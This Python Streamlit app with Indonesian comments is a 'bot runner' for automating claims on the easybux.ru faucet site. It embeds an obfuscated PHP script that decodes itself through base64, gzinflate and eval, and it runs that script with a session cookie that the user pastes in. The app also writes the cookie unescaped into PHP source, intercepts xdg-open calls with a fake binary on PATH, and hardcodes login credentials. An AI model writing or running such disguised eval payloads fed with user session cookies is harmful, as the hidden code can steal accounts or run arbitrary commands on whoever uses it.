import streamlit as st
import subprocess
import os
import time
import shutil

# --- Kode PHP yang diobfuskasi ditanamkan langsung di sini ---
obfuscated_php_script = """
<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\\x42rNK85Pz\\x63gqLU4mLq\\x43\\x43\\x63lFqe\\x61m\\x63Snp\\x43\\x62np6Rq\\x41O0sSi3TUPHJrNBE\\x41tY\\x41";
$Lix = "TMlmP\\x2b8SDXl9ENgiJ5z6p8f7tNH4nPPi9SOqU4v\\x43w9o\\x63\\x41xZh\\x2bxN2y\\x41/QiOWlKzf2hk8/\\x63vdiKEWINjUShy\\x63WF6FN\\x43/qHnNvIsJlZyQF0l2sTmxU\\x423T4lk\\x61K\\x4243Jk7G6jT0h\\x61NV5VuUtd3pKfx\\x621T3ws\\x2bSh1Jy\\x61d\\x431NlmeV2PxyLTXhYf3EkLN28ymQy8PzILRLu8tdedsj0zu6uy4VqSONhUDn\\x2bzL\\x63yu\\x638\\x61\\x2bEzZvSqFYYRIyzJy0R3\\x2bKU73TwSxk3GH\\x42PwwDSh8\\x638/\\x62IO/Gyztp8\\x63Y\\x2b8zWygE\\x42\\x43fqJroKRIQdfDE7\\x63R344WyQokX\\x43Rg9YN\\x2biy1hFwdinZMfX\\x61UGI6KEV\\x42qTdzhH5J9EKw\\x63R\\x62f7q5UdJhkgsNkKt5mQow5mSGzps3VRoW1WO6Y6W/35JV/uohZstKk\\x61XOy\\x2bSFSFJRz\\x2bySUJ\\x42N3\\x43gIWl\\x61xi2sn26lJLUZFx1K566Dnt\\x2b\\x616vXYE\\x2b5TGi\\x41qLGeR8E9\\x61ZWn1\\x42GSxXIQXk/\\x43T9mWG7Xi/v\\x63\\x41Y\\x62q4dynV\\x62xZH\\x62ZmfF4yVoqu\\x2bdJw7XN\\x41nnRenlfLdpNlmYqWVIVvZ4\\x63w9qJXlS\\x2bvm\\x63RKFlS5hwtOT3lf3\\x420\\x43xH\\x42g7yitQKr\\x41DH0SLf6\\x42ksjWKlh1M\\x63\\x633\\x43hkXZLxUv\\x612QdrnyX\\x2beIDUt\\x2bodp\\x63hIlDRiqIEu8Yoj7gN0\\x43r\\x42/\\x61pGFJ\\x63hpf7uKK\\x426DZ2vRpem\\x62X53t\\x63\\x439ZK1XOMPETxmkUrReo3pyjgwdmKuk7pGkkyOngrkewJiDTnN\\x42\\x42sIeDoq7SGdipe\\x631nEFfi9DI\\x63tyxspq\\x415sPgo\\x43DTnjUhgKWOJkFf\\x42xouIJ\\x62Ux3X\\x61KIPxJ\\x2bP\\x63x2TI1hYM\\x61rDFZ8\\x2bZfyOHT5ve4XeT3x9eO57YPEeJ\\x62wLx\\x43p8\\x41Pm8s2qD1x3\\x41Yt\\x63FmU0\\x62vf927d1HmEgE\\x63mmHy0ej\\x2bUsVSwUL\\x41VW/wERUPxS\\x43TNEnUKSUXxZPSWG6myqsID0OhTrwhOsrw59qRSxhkqjMfeqN\\x41XZR15P\\x411pSEJu\\x2bVX\\x42qSIvH8YQw\\x431k0kPiwVs0fK\\x42\\x2biqTWKjxMRYhO\\x62\\x412Vpgviz\\x63Hy\\x62vtkd\\x42V7tx\\x635lTsqsOv\\x613s5utW\\x43897uxW7QkPffW\\x2bgTvVFs\\x43ikDvdLuH\\x63vDJVouWtSTpsDuFE\\x427edNK/6Eh7l\\x62\\x42w5I7MeUErkw5Ylumhp7I/jw1y8oRHxr15Sqhi\\x2bsY/te\\x63qfD\\x2b\\x2b\\x61OkDO0iH\\x433Es3l8T\\x43\\x63RgNkt\\x41\\x2b\\x41Dm9s\\x43\\x41\\x2bYhx9\\x41Gpw\\x412K\\x41tXTVgQjHGfMDI/Ljnyd\\x2bxZxKg\\x626JWI\\x437lGQddUueyyLv8Sds9K1ntsYMD\\x2bxYe4xiIPHQG6LjiXl8vxqFlL5q0LFYonfil/\\x413\\x42Kv7W\\x2bw\\x43H\\x2bRlKVK7SsUlEkV1KsZIFL0h\\x41\\x427QuOIQRRDlIpFsL3ytrk\\x61Li0rXFEI0OQ1xZHreV8zTg\\x2b6YMrSHI9lK\\x61UfmqYoUGHGMKsE2LxtOND\\x41YlENTL8HX02D8\\x41fdq\\x41gXqK8\\x43fnWVI\\x63sIfgi7ks\\x4273NUnQhd\\x43dq9RI\\x63PM8Yt1E\\x42\\x42\\x2bNwQQTp\\x43ts\\x625Qg\\x63yhNF0Zq\\x43xs\\x62\\x2bHXf9PMinzk7KyMIym\\x43lZNWSH/xM7Td1I1wNVqk2YduUm\\x41Z\\x63uEmsuwZn\\x42IdLvyYDZQ\\x63KPwIvwYUwRWzZlnO5w1i\\x42yhtk\\x43\\x61t\\x62Xhpxhfk\\x62\\x62RWfFUZf2TSsuI4Ttq09QI\\x61Z39kzYWTzfhHUkfsI\\x41E2VQ\\x425pq\\x41dJ63J\\x42uH5IUm/\\x63mV\\x2bowG5oswPguTMx7u\\x63\\x62Xg\\x438QR\\x43LyQ2k9\\x62O1YlPT\\x435nMipESs\\x62uO5yr4\\x41xXn\\x43g\\x4224\\x639ZonEivfZIPdfWKDXMZt\\x43dwxUOgKM5Z8Its8Et\\x2b2p5O7JW\\x42gth\\x41RHlkUdK9xkmk7yDq6EK1ofq\\x62/z\\x42j6T5pIDHYmST\\x63tpmSQ3Rsx\\x43TsdP6\\x41\\x414Z\\x63/tX8V\\x636sP8jE33zKm\\x61Tl92J5L8OfM\\x61oxXDRQ4iHqylh7x7II\\x61wElFNi\\x62Zy\\x637sw61P\\x63NIz7JM7JmDz5W5ZeDrgFPtwEJ9p\\x42/TdzMoO/0F1fMmv\\x63rw\\x62wRmi\\x2bZXh2VgtDnzPMN2u8nXZsgTj0\\x435v\\x62vpSiMorIOW\\x62E0\\x42Ll\\x43tmRZ\\x61EmOxgPm\\x620w\\x41n\\x41\\x63nOivU2z41TRMqLySYMmKPLME4jP\\x412gi\\x61ilIkvWJQ8Sg5QDwkJFmpT6\\x41d8qf\\x63\\x62Yq0TS5pTNeLp0Of\\x43TKFz\\x63qqUlp99epoLTy/MGvJM8PsVNjsNSEpSQ\\x437uKkFrOWdwsHJtq5gxpFu\\x61hZY\\x2bl6I2Oo\\x426\\x2bSFQS\\x63Q/MeR\\x629I\\x2bM\\x43Ll\\x61Nyfe\\x63dx1sk3D99j/rsTm\\x2bujpVp25qnfR6\\x415LzQ8Ohz/3/JOPWsHMKnVjx88Rxo8S\\x42NHie\\x42F3s9sise2n\\x63N4/qg\\x2b\\x61jSSJ\\x428\\x2bs3vvP/P7w2/3Pf\\x63I70vQ85//ZTm9/ZPSP0POIz4NmI\\x61\\x63M\\x61Zj\\x43nJgWVLet5TWeJe1jsk\\x43Nt\\x2bne\\x62QdIXZ3FmEsqzg\\x43sIf0Meu0je4Nl7i6V1vgDR6\\x63PhwnuFz0q\\x2bP3KX4DqI7\\x42OdR2w\\x63De9k\\x61X\\x61HJ8h/kI9HKnql7PIf93r\\x2bXyMJWh86Oz5z9E\\x43ML861rF\\x62JE1N\\x43gnsf/\\x63\\x43qsZxggnoWYlJRro6\\x422I\\x63w98iFW27\\x41\\x42kWFRiJKLQ5LKN4TQvze\\x41MZrWxD\\x43V\\x2bREDM0v\\x415re4Nq7kuNtgYDq1Fp2gILDKGW7EnJ2\\x43mN1ioDwp\\x2bV\\x6355e\\x429kMuvQO3tRwDPh4MVx7sEkrDi9j1\\x41dFhEf\\x411SrwG\\x435GpETidewgJ\\x2bID\\x63z84xL\\x41\\x42JTXt/NHZh8M\\x62ELlH\\x43JgW32v5uef\\x43\\x41\\x42qSflIyELMP8zkJ3DIUdVNGQUFKlDE4gX/GyXJtZ6h\\x62p\\x43o8xIuVMLKWd1nL/5zpRhlKH\\x43yK\\x2bl\\x42\\x62\\x41U\\x41VHEnF23\\x62\\x43Grf/215imlgr4x\\x41tW33Zs9Dq8oKEPf/mRhRuwrrvgThYzzyUH9gGPoSrMLq0du9u\\x62sx2NWfn1X6yQO\\x636wO/\\x41hyT8my2W\\x42fvpt04i5NhDGZZ7RK8N\\x42\\x62URg06utROy89Yj3yv2jD32UEFi3MMwJ\\x42/hS\\x62d95uKf\\x416I6VK\\x2byoh8Y4I7P0m1qrlQnl6\\x42\\x41t\\x63Et\\x62YqMrkQgXzg8fT8G5h\\x621WZziQuPN\\x427Tg\\x42Kt28\\x63z3fSWWQK2wV\\x42USyqdYD\\x61HSxgkfx\\x43g251wW\\x41Y\\x613WH0TkmQhQTfqqXX9\\x62K\\x41FVie\\x423W72i7f91oWOu\\x43tHdf\\x42r7PiW9\\x42\\x43LLuj61rzj\\x62DfN2GmwLnnDWnM\\x63X\\x43DSEsI\\x2b\\x63Mw\\x61IqXYuZyyMZh/Q\\x2b\\x63UiRse\\x42R7\\x62\\x43ufo/7\\x63tXhRN8iWl\\x610\\x4217IKkZLvIe/fezurvUVRzre1Nt4\\x61G3t\\x62S/9kpZ2W\\x42uh\\x2b2Ur2GIMK\\x6250dMvXZHqVetn89Mfsh73mw\\x42Vr\\x62hQ2UxI06UI\\x41F59ZQ93InF\\x42Ud3UtnWY10NuK68Gkl7WqsWKM\\x63P\\x427DmfQ2\\x61d924LM6\\x41U\\x42SyZRHvRjxN\\x42QfL1Gon2nNI\\x63Ks33JELhOrRUe37pRF\\x42l\\x42ZdF6j\\x2bw\\x63s\\x63W\\x43p6\\x422dVUn9HN4T2xrS\\x41kHSro\\x62mIy2\\x42dy4NtFJWnVN0qNYx4h5oy\\x421NS\\x62udnRfP1Nq6RL3h\\x63\\x63drU3P47o\\x2b\\x41Y\\x41\\x43Pgknm\\x6191\\x61T\\x61ie\\x612KKwRf\\x63rxeKXiKN/QyZ3x4UhWY/FpmyZ\\x63J\\x61wYk\\x61TkkOoEg\\x42x\\x42\\x61SKo\\x41L94g18Q58xHR\\x41tkQQnsFzKw7HJmTRK8\\x43Lw7zmT0uE5/PUTh\\x62RZgRW\\x2bONv\\x62O6/r\\x62\\x2bO/GwTDnURGkgP\\x2b8ldyyogE\\x43\\x62\\x435l44zQLSxdiqRdNl\\x42JPIWn\\x43NxnwEUMtgN\\x61hp\\x617lQJZh\\x41IOK\\x42KqYFUg\\x41\\x41VlIN6rgxsXyG\\x62I/H75\\x41V9\\x42S4eSxPszR\\x63ww\\x61z55q9l5iLl1DT\\x2bE\\x61QjTZePo5R\\x43041OJg\\x62Kme\\x2bJLddzhGo\\x41vxSq6P5YVnkkPzjGnKEV\\x43DeW\\x43KYD9qdWtVrL4Gus\\x41Ip4KMSPWT\\x61L7/35dTU\\x42MLl\\x63\\x429\\x63Fjdgm3UxhP\\x43s0pmlUp\\x63\\x2bRsxj\\x632/RmKrsxV3o63VdlmXp0K//1I4\\x41H6mH\\x63l\\x62\\x2bdoG\\x62\\x41s\\x623idIYUr/F\\x62pdGMd3eQ\\x61oep8J8jwqf\\x6179wJN5roxQ\\x2bZyIJMtljqRmO7v8n\\x434qh6IUngUl0Wz\\x61sYQ\\x439zku3oj\\x61Y5O\\x415XlLj4\\x63tK6GXumUmvOv4dRzGzfI13\\x61r7\\x42910M\\x61NwVNqd\\x62\\x61x\\x43I\\x61\\x41Ggq6T/Pxiy1J\\x41\\x62\\x43yX\\x61DiSu\\x41Ez1rZ98Tm04JrY0eRj/5\\x61hxEr03nnHtpd1TxOK30\\x2b\\x41S8oIrD7KnJ\\x62mlRmtZeGojER\\x41n\\x63EZIi1yTOJ7dl\\x63KzHuhI\\x41HugP9iUeIIXFzT\\x2bnj2D0NjqNN6ImH\\x43X5ndpDd5ju\\x414VtI\\x43hGez\\x42ryDP5TH\\x62\\x42\\x61wPQvvLI55gFzFGzX9\\x61JYs5\\x41\\x412GF\\x427hmv5gUHYGUl\\x622/FzJGxFkIfnW9mEdMDzydHxUGfoOY\\x61stZf\\x41\\x41SvVlvk8QrmtlizwtR\\x2bTQStwWv/y1uXlJV06D1II\\x42ZtgFm61EtDl\\x2bjyp\\x61lXj68Low\\x63\\x2bHqe/\\x2b9phqD\\x61\\x62zktuHfdxo/u\\x43pdX7\\x63\\x41DvG9SsqV7uypNVp1tVXO\\x43TTk\\x41\\x43ENKz56os3ku2\\x63y0m\\x43NgY9kloDE250GGY8RQVZ20rY\\x43/e\\x61h\\x41Li4j6n3\\x2bXNL5\\x2bv3vPde9\\x42\\x43\\x61ipkD/\\x41f1T6hvPQO0R4SiZyQg\\x63fJqYuSjiREIFXrvejv5d1NhoDE7w0Vl2\\x62rsqyyY1pgXUvs5o6Rw\\x2bRV38iPW//45Tnee\\x63Tzg2umS\\x63EvnW\\x41YfR\\x2b7JfT\\x2b7z8TfO8XeVQZGUwsTq\\x63H7\\x2bRH\\x42/W8Ju\\x41YoTOuv9fI8I0DE\\x61Le\\x62DRGTMsgLGD\\x415dUVQHTYOTJYy4S\\x63Sfq/WIOylh6k7\\x43gMZH\\x421DZxUJy5I\\x4317jsY2MkH\\x63VIksF\\x633yhR1IP2yInjJ74\\x414xsEgH\\x62j\\x41JvMMf\\x416xvEUjuI4zenZ0X/H6jkGQNutNo5D\\x62e/\\x61Zgou\\x420iwz0VkmNSRXPfuhLh4xQywnThwJL\\x42RHfIV6YE\\x62\\x426rRttZu0lyiS9FXW\\x42ZqNHl9znPX\\x2bmfwMe9\\x61oZys5\\x63\\x62\\x2b\\x63\\x63\\x2bsDirE9\\x41v6yiV\\x623D/iL\\x63Z4Zh\\x2bTQ/VQ\\x2b\\x42/LQt\\x61Pktl\\x4398\\x43YQiGo\\x62GrJ\\x61kqQ\\x42\\x43It\\x42ms0R3dWJZ6SoJTqgMso4WmjYF\\x61D5wiFnv2FnS\\x619i\\x63jU3ejDTh9PgdXvx\\x63722\\x630e8e5Qo\\x42wJexPlDsGQ8O5Qs\\x42wJexPkD8GQ8\\x2b4Qw\\x42wJexPjDMHQ8u4Q0\\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;
?>
"""

# --- Konfigurasi Aplikasi ---
st.set_page_config(page_title="EasyBux Bot Runner", layout="wide", initial_sidebar_state="collapsed")

# --- Fungsi dan Logika Aplikasi ---

def check_credentials(username, password):
    """Fungsi sederhana untuk memeriksa kredensial login."""
    return username == "Tegarkaruniailham" and password == "Tegarilham4444"

def setup_bot_files(script_dir):
    """Membuat direktori dan file bot yang diperlukan dari string internal."""
    try:
        # Buat direktori jika belum ada
        if not os.path.exists(script_dir):
            os.makedirs(script_dir)
        
        # Tulis skrip PHP yang ditanamkan ke file bot.php
        with open(os.path.join(script_dir, "bot.php"), "w") as f:
            f.write(obfuscated_php_script)
        
        return True
    except Exception as e:
        st.error(f"Gagal membuat file bot: {e}")
        return False

def setup_dummy_xdg_open():
    """Membuat file xdg-open palsu untuk mencegah error di lingkungan server."""
    # File ini akan dibuat di direktori root aplikasi
    xdg_open_path = os.path.join(os.getcwd(), "xdg-open")
    if not os.path.exists(xdg_open_path):
        with open(xdg_open_path, "w") as f:
            f.write("#!/bin/sh\n")
            f.write("echo 'Mencegat panggilan xdg-open: '$@\n")
            f.write("exit 0\n")
        os.chmod(xdg_open_path, 0o755)

def main_app():
    """Fungsi untuk menampilkan antarmuka utama aplikasi setelah login berhasil."""
    st.title("🤖 EasyBux Bot Runner Mandiri")
    st.caption("Menjalankan bot yang sudah terintegrasi di dalam aplikasi.")
    
    st.sidebar.title("Navigasi")
    if st.sidebar.button("Logout"):
        st.session_state.logged_in = False
        st.rerun()

    # Siapkan file-file yang diperlukan
    setup_dummy_xdg_open()
    script_dir = "easybux_bot"
    if not setup_bot_files(script_dir):
        st.error("Gagal mempersiapkan lingkungan bot. Aplikasi tidak dapat melanjutkan.")
        return

    # --- UI Utama ---
    col1, col2 = st.columns([1, 2])

    with col1:
        st.header("⚙️ Pengaturan Bot")
        st.success("Skrip bot sudah siap digunakan dari internal aplikasi.")

        bot_options = {
            "Cek Info Akun": "1",
            "Mulai Auto Claim": "3",
            "Lihat Opsi Lain (sesuaikan nomor)": "2" 
        }

        with st.form("bot_config_form"):
            st.subheader("1. Kredensial Anda")
            user_agent = st.text_input(
                "User Agent", 
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            )
            cookie = st.text_area("Cookie", help="Masukkan cookie dari sesi login Anda di situs EasyBux.")
            
            st.subheader("2. Pilih Tugas Otomatis")
            pilihan_tugas = st.radio(
                "Pilih tugas yang ingin dijalankan:",
                options=list(bot_options.keys()),
                help="Opsi ini akan dikirim sebagai input ke skrip PHP."
            )
            
            submit_button = st.form_submit_button(label="🚀 Jalankan Bot")

        if submit_button:
            if not cookie:
                st.warning("Harap masukkan cookie Anda.")
            else:
                with col2:
                    st.header("📝 Log Eksekusi")
                    st.info(f"Mempersiapkan bot untuk tugas: '{pilihan_tugas}'...")
                    
                    nomor_pilihan = bot_options[pilihan_tugas]
                    config_content = f'<?php\n$user_agent = "{user_agent}";\n$cookie = "{cookie}";\n?>'
                    
                    try:
                        with open(os.path.join(script_dir, "config.php"), "w") as f:
                            f.write(config_content)
                        st.write("✅ File 'config.php' berhasil dibuat.")

                        my_env = os.environ.copy()
                        my_env["PATH"] = f"{os.getcwd()}:{my_env['PATH']}"
                        
                        process = subprocess.Popen(
                            ["php", "bot.php"],
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True,
                            bufsize=1,
                            universal_newlines=True,
                            cwd=script_dir,
                            env=my_env
                        )

                        process.stdin.write(f"{nomor_pilihan}\n")
                        process.stdin.flush()
                        process.stdin.close()

                        output_placeholder = st.empty()
                        log_output = ""
                        for line in iter(process.stdout.readline, ''):
                            log_output += line
                            output_placeholder.code(log_output, language="bash")
                        
                        process.stdout.close()
                        process.wait()
                        
                        st.success("Eksekusi skrip selesai.")
                        
                        stderr_output = process.stderr.read()
                        if stderr_output and "Mencegat panggilan xdg-open" not in stderr_output:
                             st.error("Pesan Error dari Skrip:")
                             st.code(stderr_output, language="bash")

                    except Exception as e:
                        st.error(f"Terjadi kesalahan yang tidak terduga: {e}")

    with col2:
        st.header("💡 Cara Penggunaan & Tips")
        st.markdown("""
        1.  **Isi Formulir**: Masukkan `User Agent` dan `Cookie` Anda, lalu pilih tugas bot.
        2.  **Jalankan Bot**: Klik tombol "Jalankan Bot" dan pantau hasilnya di panel "Log Eksekusi".
        ---
        **PERINGATAN TENTANG CAPTCHA**
        * Aplikasi ini **TIDAK BISA** menyelesaikan captcha secara otomatis.
        * Jika saat proses klaim situs `easybux.ru` meminta Anda menyelesaikan captcha (misalnya memilih gambar), bot ini **akan gagal**.
        * Keberhasilan bot ini sepenuhnya bergantung pada apakah `cookie` Anda masih valid dan apakah situs tidak meminta verifikasi captcha tambahan.
        """)

# --- Logika Halaman Login ---
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False

if st.session_state.logged_in:
    main_app()
else:
    st.title("🔐 Halaman Login")
    st.write("Silakan login untuk menggunakan Bot Runner.")
    
    with st.form("login_form"):
        username = st.text_input("Username")
        password = st.text_input("Password", type="password")
        submitted = st.form_submit_button("Login")

        if submitted:
            if check_credentials(username, password):
                st.session_state.logged_in = True
                st.success("Login berhasil! Mengalihkan...")
                time.sleep(1)
                st.rerun()
            else:
                st.error("Username atau password salah.")
